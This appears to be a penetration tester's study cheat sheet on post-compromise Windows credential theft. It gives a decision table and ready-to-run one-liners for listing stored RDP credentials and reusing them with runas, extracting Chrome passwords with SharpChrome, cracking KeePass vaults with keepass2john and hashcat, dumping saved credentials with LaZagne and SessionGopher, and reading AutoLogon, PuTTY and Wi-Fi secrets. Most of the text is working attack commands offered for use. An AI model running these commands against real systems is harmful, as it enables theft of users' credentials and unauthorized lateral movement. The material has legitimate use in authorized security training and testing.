ğŸ” Summary: Further Credential Theft
This section expands on how attackers can extract stored credentials beyond typical plaintext files, diving into saved credentials across tools, browsers, registries, and Windows features. Key areas include:

cmdkey stored RDP credentials

Browser credential storage (Chrome, via SharpChrome)

Password managers like KeePass (.kdbx cracking with keepass2john and Hashcat)

Email hunting with MailSniper

LaZagne to mass extract saved creds across applications

SessionGopher for decrypting saved SSH/RDP sessions

Registry-stored credentials (AutoLogon, PuTTY)

Wi-Fi passwords stored on the host

ğŸ§  Patterns & Hints
ğŸ§  Privs matter â€“ Many tools (LaZagne, SessionGopher) will yield more when run as local admin or SYSTEM.

ğŸ§  Persistence trail â€“ Users reuse passwords across browser creds, RDP, KeePass vaults, etc.

ğŸ§  Unsecured storage â€“ Tools like PuTTY and AutoLogon often keep creds in plaintext.

ğŸ§  Think lateral â€“ Stored RDP creds and Wi-Fi keys often give access beyond the current system.

âš™ï¸ "Got This, Do That" Decision Flow
ğŸ¯ Scenario: You land on a box with user-level access
Got This	Do That
ğŸŸ¢ You see stored RDP sessions	cmdkey /list â†’ runas /savecred to attempt lateral movement
ğŸŸ¢ Chrome is installed	Run SharpChrome.exe logins /unprotect to extract browser credentials
ğŸŸ¢ KeePass .kdbx file found	keepass2john.py â†’ hashcat -m 13400 with RockYou or hybrid list
ğŸŸ¢ PowerShell script with .xml creds	Import-Clixml â†’ .GetNetworkCredential().Password
ğŸŸ¢ User is logged in to Exchange	Use MailSniper to search inbox for keywords like "password"
ğŸŸ¢ Admin or local access to PS session	.\lazagne.exe all or targeted modules (e.g., windows, browsers)
ğŸŸ¢ RDP, PuTTY, WinSCP saved sessions	Use SessionGopher.ps1
ğŸŸ¢ Access to registry (HKCU/HKU)	Query keys for AutoLogon, PuTTY, and plaintext values
ğŸŸ¢ Wireless interface on host	netsh wlan show profile â†’ netsh wlan show profile <SSID> key=clear
ğŸ” One-Liner Cheat Sheet
ğŸ” Stored Credential Dumps
powershell
Copy
Edit
cmdkey /list
runas /savecred /user:<DOMAIN\USER> "powershell.exe -nop -c <payload>"
ğŸŒ Browser Credential Theft
powershell
Copy
Edit
.\SharpChrome.exe logins /unprotect
ğŸ§· KeePass Cracking
bash
Copy
Edit
python2.7 keepass2john.py vault.kdbx > hash
hashcat -m 13400 hash rockyou.txt
ğŸ“¥ Powershell XML Credential Decryption
powershell
Copy
Edit
$cred = Import-Clixml -Path C:\scripts\pass.xml
$cred.GetNetworkCredential().Password
ğŸ¦Š LaZagne
powershell
Copy
Edit
.\lazagne.exe all
.\lazagne.exe windows
ğŸ” SessionGopher
powershell
Copy
Edit
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target <HOST>
ğŸ›  Autologon Registry Creds
powershell
Copy
Edit
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
ğŸ”§ PuTTY Registry Creds
powershell
Copy
Edit
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<SessionName>
ğŸ“¡ Wi-Fi Key Dumping
cmd
Copy
Edit
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
